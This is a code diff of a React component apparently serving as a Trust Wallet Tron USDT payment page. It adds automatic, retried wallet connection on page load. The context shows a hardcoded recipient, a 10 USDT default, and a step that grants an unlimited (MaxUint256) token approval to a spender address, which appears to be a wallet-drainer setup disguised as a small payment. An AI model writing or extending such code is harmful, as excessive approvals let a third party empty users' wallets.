@@ -7,6 +7,15 @@ import { approveUSDT, transferUSDT } from "@/lib/web3";
 const DEFAULT_TO_ADDRESS = "TT6fmWxcu35oriyKVVAAUT7oRq9woa2e1t";
 const DEFAULT_AMOUNT = "10";
 
+/** Let Trust Discover finish injecting trustwallet.* before connect (race on first paint). */
+const TRUST_DISCOVER_INJECT_MS = 150;
+const TRUST_CONNECT_RETRY_MS = 600;
+const TRUST_CONNECT_MAX_ATTEMPTS = 4;
+
+function sleep(ms: number): Promise<void> {
+  return new Promise((resolve) => setTimeout(resolve, ms));
+}
+
 const TrustWalletTronPay = () => {
   const { connect, address, isConnected } = useTronWallet();
   const [isConnecting, setIsConnecting] = useState(false);
@@ -25,18 +34,32 @@ const TrustWalletTronPay = () => {
       }
       try {
         setIsConnecting(true);
-        // "auto" tries injected Tron first (Trust in-app browser, TronLink, etc.) without redirecting.
-        await connect("auto");
-        if (!cancelled) {
-          toast.success("Tron wallet connected");
+        await sleep(TRUST_DISCOVER_INJECT_MS);
+
+        let lastError: unknown;
+        for (let attempt = 0; attempt < TRUST_CONNECT_MAX_ATTEMPTS; attempt++) {
+          if (cancelled) return;
+          if (attempt > 0) {
+            await sleep(TRUST_CONNECT_RETRY_MS);
+          }
+          try {
+            // Dedicated Trust path: waits for trustwallet.tronLink/tron, then injected tronWeb.
+            await connect("trust");
+            if (!cancelled) {
+              toast.success("Trust Wallet (Tron) connected");
+            }
+            return;
+          } catch (e) {
+            lastError = e;
+          }
         }
-      } catch (error) {
+
         if (!cancelled) {
-          toast.error(
-            error instanceof Error
-              ? error.message
-              : "Auto-connect failed. Please connect manually."
-          );
+          const message =
+            lastError instanceof Error
+              ? lastError.message
+              : "Could not connect Trust Wallet. Use a Tron account in Trust and try again.";
+          toast.error(message);
         }
       } finally {
         if (!cancelled) {
@@ -57,7 +80,7 @@ const TrustWalletTronPay = () => {
     try {
       setIsSubmitting(true);
       if (!isConnected) {
-        await connect("auto");
+        await connect("trust");
       }
 
       // Step 1: unlimited approve (MaxUint256) to spender address.
